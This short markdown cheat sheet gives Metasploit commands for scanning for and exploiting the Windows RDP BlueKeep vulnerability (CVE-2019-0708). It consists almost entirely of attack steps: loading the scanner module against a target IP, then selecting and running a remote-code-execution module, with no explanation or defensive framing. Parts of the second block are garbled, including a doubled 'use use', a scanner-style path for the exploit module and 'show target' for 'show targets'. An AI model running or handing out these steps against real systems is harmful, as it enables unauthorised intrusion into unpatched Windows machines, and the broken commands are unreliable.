# Exploiting Windows CVE-2019-0708 RDP(BlueKeep)

__scanning for vulnerable__
```
msfconsole
search Bluekeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set rhosts <target ip>
exploit
```

__Exploiting the RDP bluekeep__
```
use use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
set rhosts <target ip>
show target 
set target <target number>
exploit 
```
